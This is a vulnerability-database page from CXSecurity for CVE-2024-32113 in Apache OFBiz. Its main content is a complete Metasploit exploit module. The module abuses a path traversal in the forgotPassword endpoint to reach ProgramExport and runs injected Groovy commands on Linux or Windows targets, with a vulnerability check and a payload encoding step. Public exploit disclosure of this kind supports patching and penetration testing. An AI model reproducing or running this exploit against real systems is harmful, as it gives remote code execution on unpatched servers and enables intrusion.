---
title: Apache OFBiz Forgot Password Directory Traversal
url: https://cxsecurity.com/issue/WLB-2024060059
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-25
fetch_date: 2025-10-06T16:54:36.152115
---

# Apache OFBiz Forgot Password Directory Traversal

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Apache OFBiz Forgot Password Directory Traversal** **2024.06.24**  Credit:  **[jheysel-r7](https://cxsecurity.com/author/jheysel-r7/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-32113](https://cxsecurity.com/cveshow/CVE-2024-32113/ "Click to see CVE-2024-32113")**  CWE: **[CWE-22](https://cxsecurity.com/cwe/CWE-22 "Click to see CWE-22")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Apache OFBiz Forgot Password Directory Traversal',
'Description' => %q{
Apache OFBiz versions prior to 18.12.13 are vulnerable to a path traversal vulnerability. The vulnerable
endpoint /webtools/control/forgotPassword allows an attacker to access the ProgramExport endpoint which in
turn allows for remote code execution in the context of the user running the application.
},
'Author' => [
'Mr-xn', # PoC
'jheysel-r7' # module
],
'References' => [
[ 'URL', 'https://github.com/Mr-xn/CVE-2024-32113'],
[ 'URL', 'https://xz.aliyun.com/t/14733?time\_\_1311=mqmx9Qwx0WDsd5YK0%3Dai%3Dmd7KbxGupD&alichlgref=https%3A%2F%2Fgithub.com%2FMr-xn%2FCVE-2024-32113'],
[ 'CVE', '2024-32113']
],
'License' => MSF\_LICENSE,
'Platform' => %w[linux win],
'Privileged' => true, # You get a root session when exploiting a docker container though user level session on Windows.
'Arch' => [ ARCH\_CMD ],
'Targets' => [
[
'Linux Command',
{
'Platform' => ['linux', 'unix'],
'Arch' => [ARCH\_CMD],
'Type' => :unix\_cmd
}
],
[
'Windows Command',
{
'Platform' => ['win'],
'Arch' => [ARCH\_CMD],
'Type' => :win\_cmd
}
],
],
'Payload' => {
'BadChars' => "\x3a"
},
'DefaultTarget' => 0,
'DisclosureDate' => '2024-05-30',
'Notes' => {
'Stability' => [ CRASH\_SAFE, ],
'SideEffects' => [ ARTIFACTS\_ON\_DISK, ],
'Reliability' => [ REPEATABLE\_SESSION, ]
},
'DefaultOptions' => {
'SSL' => true,
'RPORT' => 8443
}
)
)
end
def send\_cmd\_injection(cmd)
data = "groovyProgram=throw+new+Exception('#{cmd}'.execute().text);"
send\_request\_cgi({
'uri' => normalize\_uri(target\_uri.path, '/webtools/control/forgotPassword;/ProgramExport'),
'headers' => {
'HOST' => '127.0.0.1'
},
'method' => 'POST',
'data' => data
})
end
def check
echo\_test\_string = rand\_text\_alpha(8..12)
case target['Type']
when :win\_cmd
test\_payload = to\_unicode\_escape("cmd.exe /c echo #{echo\_test\_string}")
when :unix\_cmd
test\_payload = to\_unicode\_escape("echo #{echo\_test\_string}")
else
return CheckCode::Unknown('Please select a valid target')
end
res = send\_cmd\_injection(test\_payload)
return CheckCode::Unknown('Target did not respond to check.') unless res
unless res.get\_html\_document&.xpath("//div[@class='content-messages errorMessage' and .//p[contains(text(), 'java.lang.Exception: #{echo\_test\_string}')]]")&.empty?
return CheckCode::Vulnerable('Tested remote code execution successfully')
end
CheckCode::Safe('Attempting to exploit vulnerability failed.')
end
def to\_unicode\_escape(str)
str.chars.map { |char| '\\u%04x' % char.ord }.join
end
def exploit
print\_status('Attempting to exploit...')
res = ''
case target['Type']
when :win\_cmd
res = send\_cmd\_injection(payload.encoded)
when :unix\_cmd
res = send\_cmd\_injection(to\_unicode\_escape("sh -c $@|sh . echo #{payload.raw}"))
else
fail\_with(Failure::BadConfig, 'Invalid target specified')
end
print\_error('The target responded to the exploit attempt which is not expected. The exploit likely failed') if res
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060059)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top